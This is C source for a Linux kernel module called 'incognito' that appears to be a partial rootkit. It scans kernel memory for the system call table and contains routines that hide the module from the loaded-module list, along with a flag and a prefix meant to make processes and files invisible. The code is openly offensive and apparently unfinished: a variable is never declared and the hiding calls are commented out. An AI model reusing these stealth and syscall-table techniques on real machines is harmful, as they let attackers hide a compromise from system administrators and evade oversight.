#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/sched.h> // task_struct definition
#include <asm/unistd.h>
#include <linux/list.h>
#include <linux/init_task.h>
#include <linux/kobject.h>
#include <linux/syscalls.h>
#include <linux/slab.h>
#include <linux/version.h>

#include <asm/uaccess.h> //we are dealing with most recent kernal
#include <asm/unistd.h>

MODULE_LICENSE("GPL");

int incognito_init(void);
void incognito_exit(void);


#ifndef __KERNEL__
#define __KERNEL__
#endif

//for hiding pids and files/directories
int hidden = 0, hide_file = 0, control_flag = 0;
#define PF_INVISIBLE 0x10000000
#define INCOGNITO_PREFIX "incognito_hidden";


// -----------------------SYSTEM CALL TABLE SECTION
#if defined(__i386__)
#define START_CHECK 0xc0000000
#define END_CHECK 0xd0000000
typedef unsigned int psize;
#else
#define START_CHECK 0xffffffff81000000
#define END_CHECK 0xffffffffa2000000
typedef unsigned long psize;
#endif


psize *sys_call_table;
psize **find(void) {
 psize **sctable;
 psize i = START_CHECK;
 while (i < END_CHECK) {
  sctable = (psize **) i;
  if (sctable[__NR_close] == (psize *) sys_close) {
   return &sctable[0];
  }
  i += sizeof(void *);
 }
 return NULL;
}

// -----------------------END SYSTEM CALL TABLE SECTION


// --------------------------------this is for hiding stuff
struct list_head *module_list; 
struct task_struct *
find_task(pid_t pid)
{
	struct task_struct *p = current;
	for_each_process(p) {
		if (p->pid == pid)
			return p;
	}
	return NULL;
}

int is_invisible(pid_t pid)
{
	struct task_struct *task;
	if (!pid)
		return 0;
	task = find_task(pid);
	if (!task)
		return 0;
	if (task->flags & PF_INVISIBLE)
		return 1;
	return 0;
}

void hide(void)
{
	if (hidden)
		return;

	while (!mutex_trylock(&module_mutex))
		cpu_relax();
	mod_list = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	kfree(THIS_MODULE->sect_attrs);
	THIS_MODULE->sect_attrs = NULL;
	mutex_unlock(&module_mutex);
	hidden = 1;
}

void reveal(void)
{
	if (!hidden)
		return;

	while (!mutex_trylock(&module_mutex))
		cpu_relax();
	list_add(&THIS_MODULE->list, mod_list);
	mutex_unlock(&module_mutex);
	hidden = 0;
}

//---------------------------

int __init incognito_init(void) {
  //these two lines hide the module
  //list_del_init(&__this_module.list);
  //kobject_del(&THIS_MODULE->mkobj.kobj);

  //find system call table address
  if ((sys_call_table = (psize *) find())) {
    printk("incognito: sys_call_table found at %p\n",sys_call_table);
  } else {
    printk("incognito: sys_call_table not found\n");
  }
  printk("incognito: module loaded\n");
  return 0;
}

void __exit incognito_exit(void) {
  printk("incognito: module removed\n");
}

module_init(incognito_init);
module_exit(incognito_exit);
